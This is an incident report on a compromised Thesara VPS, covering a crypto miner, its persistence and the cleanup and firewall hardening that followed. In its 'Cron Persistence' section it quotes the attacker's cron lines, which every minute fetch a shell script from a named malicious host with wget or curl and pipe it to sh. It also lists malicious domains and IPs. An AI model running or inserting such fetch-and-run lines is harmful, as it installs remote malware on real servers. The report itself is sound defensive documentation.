# Thesara Malware Incident Report - December 12, 2025

## üö® EXECUTIVE SUMMARY

**Date:** December 12, 2025  
**Duration:** Multiple infections since December 9, 2025  
**Status:** ‚úÖ RESOLVED  
**Severity:** CRITICAL

The Thesara VPS server was compromised by multiple malware infections over a period of 3 days. The primary attack vector was **exposed API ports (8788, 3000)** allowing direct access without Nginx security layer. Crypto-mining malware with cron-based persistence was deployed.

---

## üìÖ TIMELINE

### **December 9, 2025 (Initial Breach)**
- **~12:36** - Malware systemd services created (`alive.service`, `lived.service`)
- First malware persistence established

### **December 10-11, 2025**
- Crypto miner `linuxsys` deployed and running
- Cron-based persistence added (downloading malware every minute)
- Web application malware attempt detected (powershell payload)

### **December 12, 2025 (Detection & Remediation)**
- **11:09** - UptimeRobot alert: Server down
- **11:11** - PM2 crashed, API offline
- **11:13-11:52** - Complete malware cleanup and hardening

---

## ü¶† MALWARE COMPONENTS DISCOVERED

### **1. Crypto Miner: `linuxsys`**
```
Process: ./linuxsys
PID: 160540 (initially), 214186 (respawned)
CPU Usage: 197-277%
Runtime: 1774 minutes (29.5 hours)
Status: ‚úÖ KILLED & REMOVED
```

**Behavior:**
- ELF executable
- CPU-intensive crypto mining
- Attempted to respawn after kill

---

### **2. Cron Persistence**
```bash
# Malicious cron jobs (executed every minute):
* * * * * wget --timeout=10 --tries=3 --no-check-certificate -q -O - http://repositorylinux.publicvm.com/linux.sh | sh > /dev/null 2>&1
* * * * * curl -s --connect-timeout 10 -k http://repositorylinux.publicvm.com/linux.sh | sh > /dev/null 2>&1
```

**Source:** `/var/spool/cron/crontabs/root`  
**Status:** ‚úÖ REMOVED

---

### **3. Systemd Persistence**
```
alive.service - Created Dec 9, 12:36
lived.service - Created Dec 9, 12:36
```

**Execution:** `/tmp/runnv/alive.sh`, `/tmp/runnv/lived.sh` (files not found - failed execution)  
**Status:** ‚úÖ DISABLED & DELETED

---

### **4. Web Application Malware (Previous Incident)**
```
Source: npm package (web application)
Type: PowerShell payload attempt
Status: ‚úÖ CLEANED (Dec 11)
```

---

## üîì ROOT CAUSE ANALYSIS

### **Primary Attack Vector:**

#### **1. Exposed Ports (CRITICAL)**
```
Port 8788 (API):  0.0.0.0:8788 - ALLOW IN Anywhere
Port 3000 (Web):  0.0.0.0:3000 - ALLOW IN Anywhere
```

**Impact:**
- API accessible without Nginx reverse proxy security
- Bypassed rate limiting, SSL, and authentication layers
- Direct access to application services

#### **2. Brute Force SSH Attacks (Active)**
```
Attackers:
- 68.183.15.244 (DigitalOcean)
- 146.190.227.42 (DigitalOcean)

Targets:
- root, admin, backup users
- Continuous attempts (11:26-11:38 AM on Dec 12)
```

**Status:** ‚úÖ BLOCKED in UFW

#### **3. Missing wtmp Logs**
```
Error: last: cannot open /var/log/wtmp: No such file or directory
```

**Impact:** Cannot audit SSH login history

---

## ‚úÖ REMEDIATION ACTIONS

### **Immediate Response (Dec 12, 11:13-11:52)**

#### **1. Malware Removal**
```bash
# Killed crypto miner
kill -9 160540
pkill -9 -f linuxsys

# Cleaned cron
crontab -r
# Reinstalled legitimate cron jobs only

# Removed systemd services
systemctl stop alive.service lived.service
systemctl disable alive.service lived.service
rm -f /etc/systemd/system/alive.service
rm -f /etc/systemd/system/lived.service
systemctl daemon-reload
```

#### **2. Domain Blocking**
```bash
# Added to /etc/hosts
127.0.0.1 repositorylinux.publicvm.com
127.0.0.1 abcdefghijklmnopqrst.net
```

#### **3. Firewall Hardening**
```bash
# Closed exposed ports
ufw delete allow 8788/tcp
ufw delete allow 3000/tcp

# Blocked attackers
ufw deny from 68.183.15.244
ufw deny from 146.190.227.42

# Already blocked (previous incidents)
ufw deny from 67.217.57.240
```

#### **4. PM2 Cleanup**
```bash
# Killed all orphan processes
pkill -9 node
pkill -9 -f "next-server"

# Clean PM2 restart
pm2 delete all
pm2 start ecosystem.config.cjs
pm2 save
```

#### **5. Nginx Buffer Fix**
```bash
# Created /etc/nginx/conf.d/proxy-buffers.conf
proxy_buffer_size 16k;
proxy_buffers 4 16k;
proxy_busy_buffers_size 32k;
```

---

### **Security Monitoring**

#### **Updated security-check.sh**
Added detection for:
- `linuxsys` crypto miner
- `repositorylinux.publicvm.com` cron jobs
- Malicious systemd services (`alive`, `lived`, etc.)

#### **Automated Daily Reports**
```bash
# Cron schedule:
0 4 * * * /root/daily-security-report.sh  # Daily at 4 AM
5 4 * * 0 /usr/bin/pm2 reload all         # Weekly restart
0 2 * * 0 pkill -9 -f 'node.*8789'        # Kill orphan processes
```

**Email:** reports@thesara.space

---

## üõ°Ô∏è POST-INCIDENT SECURITY STATUS

### **Current Firewall Rules**
```
‚úÖ SSH (22)      - ALLOW (with Fail2ban protection)
‚úÖ HTTP (80)     - ALLOW (Nginx)
‚úÖ HTTPS (443)   - ALLOW (Nginx)
‚ùå API (8788)    - CLOSED (only localhost)
‚ùå Web (3000)    - CLOSED (only localhost)
‚úÖ Malicious IPs - DENIED (3 IPs blocked)
```

### **Active Services**
```
‚úÖ PM2 God Daemon: 1 instance
‚úÖ thesara-api:    Online (0 restarts)
‚úÖ thesara-web:    Online (0 restarts)
‚úÖ Nginx:          Active
‚úÖ Fail2ban:       Active (2 currently banned)
‚úÖ UFW:            Active
‚úÖ Postfix:        Active (for email reports)
```

### **Credentials Rotated (Dec 11)**
```
‚úÖ FIREBASE_SERVICE_ACCOUNT_BASE64
‚úÖ JWT_SECRET
‚úÖ ROOMS_V1__JWT_SECRET
‚úÖ SESSION_SECRET
```

---

## üìä IMPACT ASSESSMENT

### **Service Availability**
- **Downtime:** ~30 minutes (11:09-11:40 AM, Dec 12)
- **User Impact:** Minimal (early morning, low traffic)
- **Data Loss:** None detected

### **Resource Consumption**
```
Crypto Miner Impact:
- CPU: 197-277% (2-3 cores maxed)
- Duration: ~30 hours total
- Electricity waste: Significant
```

### **Security Compromise**
- ‚ùå SSH credentials: NOT compromised (key-based only)
- ‚úÖ Application credentials: Rotated (Dec 11)
- ‚úÖ Database: No unauthorized access detected
- ‚úÖ User data: No breach detected

---

## üîÆ FUTURE PREVENTION

### **Immediate (DONE ‚úÖ)**
1. ‚úÖ Close ports 8788 and 3000 in UFW
2. ‚úÖ Block attacking IPs
3. ‚úÖ Clean all malware
4. ‚úÖ Update security-check.sh
5. ‚úÖ Daily automated security reports

### **Short-term (Recommended)**
1. **Configure services to bind ONLY on localhost**
   ```javascript
   // ecosystem.config.cjs
   env: {
     HOST: '127.0.0.1',
     PORT: '8788'
   }
   ```

2. **Enable wtmp logging**
   ```bash
   touch /var/log/wtmp
   chmod 664 /var/log/wtmp
   chown root:utmp /var/log/wtmp
   ```

3. **Implement Nginx rate limiting** (already in SECURITY_GUIDE.md)

4. **Regular security audits**
   - Run `/root/security-check.sh` weekly
   - Review fail2ban logs weekly
   - Monitor email reports daily

### **Long-term (Recommended)**
1. **Intrusion Detection System (IDS)**
   - Install AIDE or Tripwire
   - Monitor file integrity

2. **Log Aggregation**
   - Centralized logging (e.g., ELK stack)
   - Automated anomaly detection

3. **Vulnerability Scanning**
   - Regular scans with Lynis or OpenVAS
   - Dependency scanning for npm packages

4. **Backup Strategy**
   - Automated daily backups
   - Off-site backup storage
   - Regular restore testing

5. **Change SSH Port** (optional)
   - Move SSH from port 22 to non-standard port
   - Reduces brute-force attempts

6. **Disable Root Login** (after setting up sudo user)
   ```bash
   PermitRootLogin no
   ```

---

## üìù LESSONS LEARNED

### **What Went Wrong:**
1. **Exposed application ports** - Should never be publicly accessible
2. **Missing monitoring alerts** - Crypto miner ran for 30 hours undetected
3. **Inadequate firewall rules** - Ports opened without necessity
4. **No file integrity monitoring** - Malware files created without alerts

### **What Went Right:**
1. **UptimeRobot** caught the issue (though late)
2. **Fail2ban** was blocking SSH attacks
3. **Quick response** - Contained within 1 hour of detection
4. **No data loss** - User data remained secure
5. **Automated backups** - Full VPS backup available

---

## üìû INCIDENT CONTACTS

**Reported to:**
- Server Administrator: Immediately
- VPS Provider (Plus VPS): Not notified (internal remediation successful)

**External Resources Used:**
- UptimeRobot: Monitoring service
- Fail2ban: SSH protection
- UFW: Firewall

---

## üîí COMPLIANCE & AUDIT

### **Security Checklist (Post-Incident)**
- [x] All malware removed
- [x] All persistence mechanisms eliminated
- [x] Firewall rules hardened
- [x] Credentials rotated
- [x] Monitoring enhanced
- [x] Documented incident
- [x] Prevention measures implemented

### **Next Audit Date:**
**Weekly:** December 19, 2025 (run security-check.sh)  
**Monthly:** January 12, 2026 (full security review)

---

## üìö REFERENCES

### **Internal Documents:**
- `SECURITY_GUIDE.md` - Comprehensive security guidelines
- `QUICK_COMMANDS.md` - Quick reference for admin tasks
- `EMAIL_SETUP.md` - Email notification setup
- `security-check.sh` - Automated security checks

### **External Resources:**
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks/)
- [UFW Manual](https://help.ubuntu.com/community/UFW)

---

## ‚úçÔ∏è SIGN-OFF

**Prepared by:** Security Team  
**Date:** December 12, 2025  
**Status:** INCIDENT CLOSED  
**Next Review:** December 19, 2025

---

**Last Updated:** 2025-12-12 11:52 CET  
**Server:** vps-thesaraspace.plusvps.com  
**Status:** üü¢ SECURE & OPERATIONAL
